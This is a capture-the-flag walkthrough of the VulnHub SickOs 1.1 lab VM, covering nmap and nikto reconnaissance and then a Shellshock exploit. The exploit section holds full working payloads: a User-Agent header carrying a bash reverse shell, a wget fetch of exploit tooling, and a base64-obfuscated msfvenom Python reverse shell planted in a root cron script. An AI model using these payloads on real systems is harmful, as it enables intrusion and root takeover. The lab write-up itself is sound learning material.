# Boot2RootCTF_SickOs: 1.1

*Note: This box was completed long ago and I am going off of the VMware snapshot I saved after completion, some visuals will be missing and explained instead.*

## Objective

We must go from visiting a simple website to having root access over the entire web server.

We'll download the VM from [here](https://www.vulnhub.com/entry/sickos-11,132/) and set it up with VMware Workstation 16.

Once the machine is up, we get to work.

## Step 1 - Reconnaissance

After finding our IP address using ```ifconfig``` and locating the second host on the network, we can run an Nmap scan to probe it for information.

```
sudo nmap -sS -sC -Pn -PA -A -T4 -v -f --version-all --osscan-guess 192.168.57.130             
Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-30 09:17 EDT
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 09:17
...
Completed NSE at 09:17, 0.00s elapsed
Initiating ARP Ping Scan at 09:17
Scanning 192.168.57.130 [1 port]
Completed ARP Ping Scan at 09:17, 0.05s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 09:17
Completed Parallel DNS resolution of 1 host. at 09:17, 0.02s elapsed
Initiating SYN Stealth Scan at 09:17
Scanning 192.168.57.130 [1000 ports]
Discovered open port 22/tcp on 192.168.57.130
Discovered open port 3128/tcp on 192.168.57.130
Completed SYN Stealth Scan at 09:17, 4.51s elapsed (1000 total ports)
Initiating Service scan at 09:17
Scanning 2 services on 192.168.57.130
Completed Service scan at 09:18, 11.02s elapsed (2 services on 1 host)
Initiating OS detection (try #1) against 192.168.57.130
NSE: Script scanning 192.168.57.130.
Initiating NSE at 09:18
...
Completed NSE at 09:18, 0.00s elapsed
Nmap scan report for 192.168.57.130
Host is up (0.00051s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT     STATE  SERVICE    VERSION
22/tcp   open   ssh        OpenSSH 5.9p1 Debian 5ubuntu1.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 09:3d:29:a0:da:48:14:c1:65:14:1e:6a:6c:37:04:09 (DSA)
|   2048 84:63:e9:a8:8e:99:33:48:db:f6:d5:81:ab:f2:08:ec (RSA)
|_  256 51:f6:eb:09:f6:b3:e6:91:ae:36:37:0c:c8:ee:34:27 (ECDSA)
3128/tcp open   http-proxy Squid http proxy 3.1.19
|_http-title: ERROR: The requested URL could not be retrieved
| http-open-proxy: Potentially OPEN proxy.
|_Methods supported: GET HEAD
|_http-server-header: squid/3.1.19
8080/tcp closed http-proxy
MAC Address: 00:0C:29:D2:A1:FA (VMware)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Uptime guess: 0.002 days (since Thu Jun 30 09:15:14 2022)
Network Distance: 1 hop
TCP Sequence Prediction: Difficulty=263 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.51 ms 192.168.57.130

NSE: Script Post-scanning.
Initiating NSE at 09:18
...
Completed NSE at 09:18, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.78 seconds
           Raw packets sent: 2030 (91.680KB) | Rcvd: 16 (764B)
```

We can first notice that port ```3128/tcp``` is open for an HTTP proxy server.

After configuring Firefox with the proxy of ```192.168.57.130:3128```, we can access the website, which has nothing really fascinating on it.

Running a gobuster scan revealed a ```robots.txt``` folder, which in it contained a ```/wolfcms``` folder.

While manually going through ```/wolfcms``` and researching what it was, I kicked off a general nikto scan of the website.

```
sudo nikto --host http://192.168.57.130 --useproxy http://192.168.57.130:3128
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.57.130
+ Target Hostname:    192.168.57.130
+ Target Port:        80
+ Proxy:              192.168.57.130:3128
+ Start Time:         2022-06-30 09:28:45 (GMT-4)
---------------------------------------------------------------------------
+ Server: Apache/2.2.22 (Ubuntu)
+ Retrieved via header: 1.0 localhost (squid/3.1.19)
+ Retrieved x-powered-by header: PHP/5.3.10-1ubuntu3.21
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ Uncommon header 'x-cache-lookup' found, with contents: MISS from localhost:3128
+ Uncommon header 'x-cache' found, with contents: MISS from localhost
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Server may leak inodes via ETags, header found with file /robots.txt, inode: 265381, size: 45, mtime: Fri Dec  4 19:35:02 2015
+ Server banner has changed from 'Apache/2.2.22 (Ubuntu)' to 'squid/3.1.19' which may suggest a WAF, load balancer or proxy is in place
+ Uncommon header 'x-squid-error' found, with contents: ERR_INVALID_URL 0
+ Apache/2.2.22 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ Uncommon header 'tcn' found, with contents: list
+ Apache mod_negotiation is enabled with MultiViews, which allows attackers to easily brute force file names. See http://www.wisec.it/sectou.php?id=4698ebdc59d15. The following alternatives for 'index' were found: index.php
+ Uncommon header '93e4r0-cve-2014-6271' found, with contents: true
+ OSVDB-112004: /cgi-bin/status: Site appears vulnerable to the 'shellshock' vulnerability (http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6278).
+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.
+ 8726 requests: 0 error(s) and 15 item(s) reported on remote host
+ End Time:           2022-06-30 09:29:16 (GMT-4) (31 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```
The scan results revealed something crucial about the website, ```Site appears vulnerable to the 'shellshock' vulnerability```.

## Step 2 - Exploitation

Not immediately knowing what this was, I did more research into what this was and how I would be able to replicate it.

My research led me to [this documentation](https://www.cybureau.org/library/wp-content/uploads/sites/3/2021/02/Blind_SSRF_with_Shellshock_Exploitation.pdf) that explains how the user executed the exploit.

According to the write-up, by inserting the payload into the ```User-Agent``` header of a captured GET request, we can follow the payload with any bash command to perform an RCE.

Therefore, using BurpSuite I made a GET request for ```{IP}/cgi-bin/status/```, intercepted it, and used a simple Bash reverse shell command.

```
GET http://192.168.57.130/cgi-bin/status HTTP/1.1
Host: 192.168.57.130
User-Agent: () { :;}; /bin/bash -c 'bash -i >& /dev/tcp/192.168.57.129/5555 0>&1'
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
```

The full payload used here was ```() { :;}; /bin/bash -c 'bash -i >& /dev/tcp/192.168.57.129/5555 0>&1'```, where any Bash command after the first semicolon (in this case, a simple TCP connect) could be executed.

I also ran a NetCat listener to capture the connection request and was inevitably able to break into the host.

```
sudo nc -lvnp 5555                 
[sudo] password for meowmycks: 
listening on [any] 5555 ...
connect to [192.168.57.129] from (UNKNOWN) [192.168.57.130] 53647
```

I then upgraded to a TTY shell.

```
www-data@SickOs:/usr/lib/cgi-bin$ python3 -c 'import pty;pty.spawn("/bin/bash")'
<i-bin$ python3 -c 'import pty;pty.spawn("/bin/bash")'                       
The program 'python3' is currently not installed.  To run 'python3' please ask your administrator to install the package 'python3-minimal'
www-data@SickOs:/usr/lib/cgi-bin$ python -c 'import pty;pty.spawn("/bin/bash")'
<i-bin$ python -c 'import pty;pty.spawn("/bin/bash")'                        
www-data@SickOs:/usr/lib/cgi-bin$ ^Z
zsh: suspended  sudo nc -lvnp 5555
                                                                                                                                                                                                                                            
┌──(meowmycks㉿catBook)-[~]
└─$ stty raw -echo;fg 
[1]  + continued  sudo nc -lvnp 5555


www-data@SickOs:/usr/lib/cgi-bin$ export TERM=xterm
export TERM=xterm
```

## Step 3 - Privilege Escalation

Now that I had a foothold in the server, I could focus on upgrading to root.

I set up an HTTP server on my Kali box using ```sudo python3 -m http.server 80``` to be able to download scripts to the target machine using ```wget``` commands.

By doing this, I can circumvent any potential problems with not being able to get scripts from GitHub or any other external sources, and because it's more convenient.


```
sudo python3 -m http.server 80                                               
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Once I had the server online, I downloaded a copy of Linux Smart Enumeration (LSE) from my PC that was originally obtained from [here](https://github.com/diego-treitos/linux-smart-enumeration).

LSE allowed me to scan the host for common privilege escalation points and some additional known vulnerabilities. 
However, LSE does not include scripts to exploit said vulnerabilities should any be detected.
Therefore, I had packaged scripts in with my copy of LSE in a compressed folder for the sake of convenience.

```
wget http://192.168.57.129/lse.zip
wget http://192.168.57.129/lse.zip
--2022-06-30 19:00:04--  http://192.168.57.129/lse.zip
Connecting to 192.168.57.129:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 22327785 (21M) [application/zip]
Saving to: `lse.zip'

100%[======================================>] 22,327,785  31.9M/s   in 0.7s    

2022-06-30 19:00:04 (31.9 MB/s) - `lse.zip' saved [22327785/22327785]
```

After unzipping the folder and executing the script, I received plenty of useful information about the host.

A big thing LSE found was a couple of cron job running as root in directores I had write access in.

```
=======================================================( recurrent tasks )=====
[*] ret000 User crontab.................................................... nope
[!] ret010 Cron tasks writable by user..................................... nope
[*] ret020 Cron jobs....................................................... yes!
[*] ret030 Can we read user crontabs....................................... nope
[*] ret040 Can we list other user cron tasks?.............................. nope
[*] ret050 Can we write to any paths present in cron jobs.................. yes!
[!] ret060 Can we write to executable paths present in cron jobs........... yes!
---
/etc/cron.d/php5:09,39 *     * * *     root   [ -x /usr/lib/php5/maxlifetime ] && [ -d /var/lib/php5 ] && find /var/lib/php5/ -depth -mindepth 1 -maxdepth 1 -type f -cmin +$(/usr/lib/php5/maxlifetime) ! -execdir fuser -s {} 2>/dev/null \; -delete
/etc/cron.d/php5:09,39 *     * * *     root   [ -x /usr/lib/php5/maxlifetime ] && [ -d /var/lib/php5 ] && find /var/lib/php5/ -depth -mindepth 1 -maxdepth 1 -type f -cmin +$(/usr/lib/php5/maxlifetime) ! -execdir fuser -s {} 2>/dev/null \; -delete
/etc/cron.d/automate:* * * * * root /usr/bin/python /var/www/connect.py
---
[i] ret400 Cron files...................................................... skip
[*] ret500 User systemd timers............................................. nope                                                                                                                                                            
[!] ret510 Can we write in any system timer?............................... nope
[i] ret900 Systemd timers.................................................. skip
```

Particularly, we had write access to the file in this job in particular: ```/etc/cron.d/automate:* * * * * root /usr/bin/python /var/www/connect.py```

Clearly this is a Python script. Whatever it originally does isn't so important as what we might be able to make it do...

... Such as implanting another reverse shell script to automatically run every minute.

To do that, I used msfvenom to craft a reverse_python payload to then write into the Python script.

```
msfvenom -p cmd/unix/reverse_python LHOST=192.168.57.129 LPORT=4444 -f raw
[-] No platform was selected, choosing Msf::Module::Platform::Unix from the payload
[-] No arch selected, selecting arch: cmd from the payload
No encoder specified, outputting raw payload
Payload size: 573 bytes
python -c "exec(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('aW1wb3J0IHNvY2tldCAgICAsICAgICBzdWJwcm9jZXNzICAgICwgICAgIG9zICAgICAgICA7aG9zdD0iMTkyLjE2OC41Ny4xMjkiICAgICAgICA7cG9ydD00NDQ0ICAgICAgICA7cz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVUICAgICwgICAgIHNvY2tldC5TT0NLX1NUUkVBTSkgICAgICAgIDtzLmNvbm5lY3QoKGhvc3QgICAgLCAgICAgcG9ydCkpICAgICAgICA7b3MuZHVwMihzLmZpbGVubygpICAgICwgICAgIDApICAgICAgICA7b3MuZHVwMihzLmZpbGVubygpICAgICwgICAgIDEpICAgICAgICA7b3MuZHVwMihzLmZpbGVubygpICAgICwgICAgIDIpICAgICAgICA7cD1zdWJwcm9jZXNzLmNhbGwoIi9iaW4vYmFzaCIp')[0]))"
```
```
www-data@SickOs:/var/www$ echo "exec(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('aW1wb3J0IHNvY2tldCAgICAsICAgICBzdWJwcm9jZXNzICAgICwgICAgIG9zICAgICAgICA7aG9zdD0iMTkyLjE2OC41Ny4xMjkiICAgICAgICA7cG9ydD00NDQ0ICAgICAgICA7cz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVUICAgICwgICAgIHNvY2tldC5TT0NLX1NUUkVBTSkgICAgICAgIDtzLmNvbm5lY3QoKGhvc3QgICAgLCAgICAgcG9ydCkpICAgICAgICA7b3MuZHVwMihzLmZpbGVubygpICAgICwgICAgIDApICAgICAgICA7b3MuZHVwMihzLmZpbGVubygpICAgICwgICAgIDEpICAgICAgICA7b3MuZHVwMihzLmZpbGVubygpICAgICwgICAgIDIpICAgICAgICA7cD1zdWJwcm9jZXNzLmNhbGwoIi9iaW4vYmFzaCIp')[0]))" > connect.py
```

After opening another NetCat listener and waiting for a few seconds, I got a connection.

```
sudo nc -lvnp 4444                 
[sudo] password for meowmycks: 
listening on [any] 4444 ...
connect to [192.168.57.129] from (UNKNOWN) [192.168.57.130] 37768
whoami
root
```

I upgraded the shell again (because why not), and finally got the flag.

```
python -c 'import pty;pty.spawn("/bin/bash")'
root@SickOs:~# ^Z
zsh: suspended  sudo nc -lvnp 4444
                                                                                                                                                                                                                                            
┌──(meowmycks㉿catBook)-[~]
└─$ stty raw -echo;fg 
[1]  + continued  sudo nc -lvnp 4444


root@SickOs:~# export TERM=xterm
export TERM=xterm
root@SickOs:~# ls
ls
a0216ea4d51874464078c618298b1367.txt
root@SickOs:~# cat a0216ea4d51874464078c618298b1367.txt
cat a0216ea4d51874464078c618298b1367.txt
If you are viewing this!!

ROOT!

You have Succesfully completed SickOS1.1.
Thanks for Trying


root@SickOs:~#
```

## Conclusion

By the end of this box, I had learned more about doing research and figuring out how to execute exploits for known vulnerabilities.

With the recent addition of LSE to my arsenal, things became much easier (for better or worse) to do and I felt more able to progress without needlessly getting stuck on minor and unimportant details.
